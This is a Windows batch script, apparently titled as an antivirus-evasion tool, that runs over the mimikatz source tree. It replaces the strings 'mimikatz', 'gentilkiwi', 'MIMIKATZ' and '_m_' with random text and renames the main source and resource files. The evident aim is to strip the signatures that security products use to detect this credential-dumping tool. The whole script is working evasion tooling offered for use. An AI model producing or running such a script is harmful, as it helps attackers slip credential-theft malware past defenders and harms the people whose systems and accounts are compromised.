@echo off
:: 随机字符
setlocal enabledelayedexpansion

set _out=

call :RandomStr 10
tools\grep.exe -rl --exclude-dir .git --exclude-dir tools --exclude-dir .idea --exclude miansha.bat --exclude mimikatz.sln "mimikatz" . | tools\xargs tools\sed -b -i "s/mimikatz/!_out!/g"
tools\mv ./mimikatz/mimikatz.h ./mimikatz/!_out!.h
tools\mv ./mimikatz/mimikatz.c ./mimikatz/!_out!.c
tools\mv ./mimikatz/mimikatz.ico ./mimikatz/!_out!.ico
tools\mv ./mimikatz/mimikatz.rc ./mimikatz/!_out!.rc

for %%a in (gentilkiwi MIMIKATZ _m_) do (
    call :RandomStr 10
    tools\grep.exe -rl --exclude-dir .git --exclude-dir tools --exclude-dir .idea --exclude miansha.bat --exclude mimikatz.sln "%%a" . | tools\xargs tools\sed -b -i "s/%%a/!_out!/g"
)



:: =================
:: 生成随机字符串
:: =================
::
:RandomStr <int>
    set d_len=%1
    set d_StrList=abcdefghijVESklmnopqrstuvwxyzJKO

    set len=%d_len%
    @rem 随机"最小字符个数-最大字符个数"
    for /f "tokens=1,2 delims=- " %%a in ("%len%") do (
            set /a min_len = %%a, max_len = %%a+5
            set /a "len = %random% %% (max_len-min_len+1) + min_len"
    )

    @rem ############## 获取字符串
    set StrList=%d_StrList%

    @rem ############## 计算字符串长度
    call :StrLen "%StrList%"


    set _out=
    for /l %%n in (1 1 %len%) do (
            set /a pos = !random! %% StrLen
            for %%p in (!pos!) do set _out=!_out!!StrList:~%%p,1!
    )
goto:eof

:: =================
:: 计算字符串长度
:: =================
::
:StrLen <string>
    set "_StrList=%~1"
    set StrLen=1
    for %%a in (2048 1024 512 256 128 64 32 16) do (
            if "!_StrList:~%%a!" neq "" (
                    set /a StrLen += %%a
                    set _StrList=!_StrList:~%%a!
            )
    )
    set _StrList=!_StrList!fedcba9876543210
    set /a StrLen += 0x!_StrList:~16,1!
goto:eof